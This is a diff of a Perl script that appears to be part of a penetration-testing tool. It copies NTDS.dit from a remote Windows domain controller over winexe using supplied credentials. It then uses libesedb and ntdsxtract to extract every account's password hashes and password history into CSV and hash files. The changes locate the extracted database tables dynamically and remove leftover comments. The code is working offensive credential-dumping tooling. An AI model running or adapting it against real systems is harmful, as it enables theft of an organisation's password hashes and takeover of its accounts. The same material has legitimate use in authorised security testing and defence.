@@ -40,6 +40,7 @@ if ($ARGV[0] eq "--ntds"){
 
 	# Use libesedb and ntdsxtract to get the hashes from the AD
 	my ($ntds,$system)=("NTDS.dit","SYSTEM.hive"); # NEET default filenames
+	my ($datatable,$linktable);
 
 	# Override the default filenames from the command line
 	$ntds=$ARGV[1] if ($ARGV[1]);
@@ -55,18 +56,37 @@ if ($ARGV[0] eq "--ntds"){
 	}
 	if (!$err){
 		# Do the extraction
-		if (-d "ntds.dit.export"){
+		if (-d "${ntds}.export"){
 			print "NTDS appears to have been exported already. Skipping the initial extraction.\n";
 		} else { 
 			system ("$esedb $ntds");
 		}
-		if (-f "${ntds}.export/datatable.3" && -f "${ntds}.export/link_table.4"){
-			print "\nExtracting password hashes in ophcrack format. This can take up to half an hour for an\n" .
+
+		# Find the datatable and linktable filenames
+		my $directory;
+		if (-d "${ntds}.export" && opendir($directory,"${ntds}.export")){
+			while (my $entry=readdir($directory)){
+				if ($entry =~ /^datatable\.(\d)/){
+					$datatable="datatable.$1";
+					next;
+				}
+				if ($entry =~ /^link_table\.(\d)/){
+					$linktable="link_table.$1";
+					next;
+				}
+				last if ($linktable && $datatable);
+			}
+			closedir $directory;
+		}
+
+		if (defined($datatable) && defined($linktable) &&
+				-f "${ntds}.export/$datatable" && -f "${ntds}.export/$linktable"){
+			print "\nExtracting password hashes in pwdump format. This can take up to half an hour for an\n" .
 						"Active Directory with thousands of users. You can periodically \"wc -l accounts.csv\" to check\n" .
 						"progress. Started at: ";
 			system("date");
 
-			my $rc=system ("python $ntdsxtract ${ntds}.export/datatable.3 ${ntds}.export/link_table.4 ${ntds}.export/ --syshive $system --pwdformat ophc --passwordhashes --passwordhistory --csvoutfile ../accounts.csv --ntoutfile ../nthashes.txt > hivedump.txt 2>/dev/null");
+			my $rc=system ("python $ntdsxtract ${ntds}.export/$datatable ${ntds}.export/$linktable ${ntds}.export/ --syshive $system --pwdformat ophc --passwordhashes --passwordhistory --csvoutfile ../accounts.csv --ntoutfile ../nthashes.txt > hivedump.txt 2>/dev/null");
 			$rc = $rc << 8;
 
 			if ($rc == 0){
@@ -287,7 +307,6 @@ if ($OS =~ /2003/ || $OS =~ /2008/){
 				#print " - Copying $relative to \%WINDIR\%\\${REMOTE_DIR}\\\n";
 				print "   Copying NTDS.dit\n";
 				my $result=rbacktick("copy \"$relative\" \%WINDIR\%\\${REMOTE_DIR}\\\\NTDS.dit");
-				#print $result;
 				if (index($result,"1 file(s) copied")){
 					print " + Successfully copied\n";
 					push @RESULTS, "NTDS.dit";
@@ -405,8 +424,6 @@ sub check64 {
 sub cleanup {
 	print "*** Cleaning up the remote host $host...\n";
 	# Clean up the winexe service - delete the service
-	#silentRexec("cmd.exe /c ghsc.exe delete winexesvc"); 
-	#silentRexec("cmd.exe /c net stop winexesvc");
 	system("winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
 	for my $file (@FILES){
 		rdel($file);
